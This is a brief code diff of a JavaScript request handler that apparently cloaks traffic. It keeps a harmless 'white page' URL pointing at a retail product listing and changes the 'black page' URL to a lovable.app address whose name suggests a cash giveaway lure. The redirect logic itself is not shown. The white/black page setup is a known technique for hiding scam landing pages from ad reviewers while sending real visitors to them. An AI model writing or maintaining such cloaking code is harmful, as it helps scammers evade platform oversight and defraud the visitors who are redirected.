@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.coolblue.be/en/product/893472/brabantia-trash-bags-code-m-60l-120-units.html";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
 
     //testing
   
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
